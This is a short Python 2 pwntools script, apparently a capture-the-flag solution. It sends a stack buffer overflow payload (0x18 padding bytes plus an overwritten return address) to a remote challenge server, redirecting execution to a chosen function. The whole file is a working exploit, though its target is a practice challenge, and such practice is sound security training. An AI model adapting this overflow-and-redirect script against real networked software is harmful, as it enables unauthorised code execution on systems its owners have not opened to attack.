from pwn import *
context.arch='i386'

# just overflow

# p = process('./bbys')
p = remote('node3.buuoj.cn',27038)

payload = 'A'*(0x18) + p32(0x0804856D)
# p.recvuntil("This program is hungry. You should feed it.\n")
p.sendline(payload)
print p.recv()
